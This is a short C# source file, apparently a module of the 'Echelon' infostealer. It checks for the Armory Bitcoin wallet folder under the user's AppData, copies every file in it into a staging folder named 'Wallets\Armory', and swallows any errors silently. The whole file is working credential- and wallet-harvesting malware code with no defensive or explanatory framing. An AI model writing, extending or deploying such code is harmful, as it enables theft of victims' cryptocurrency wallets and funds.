

using System.IO;

namespace Echelon
{
    internal class Armory
    {
        public static int count;

        public static void ArmoryStr(string directorypath)  // Works
        {
            try
            {
                if (Directory.Exists(Help.AppDate + "\\Armory\\"))
                {
                    foreach (var file in new DirectoryInfo(Help.AppDate + "\\Armory\\").GetFiles())

                    {
                        Directory.CreateDirectory(directorypath + "\\Wallets\\Armory\\");
                        file.CopyTo(directorypath + "\\Wallets\\Armory\\" + file.Name);
                    }
                    count++;
                    Wallets.count++;
                }
            }
            catch { }

        }
    }
}
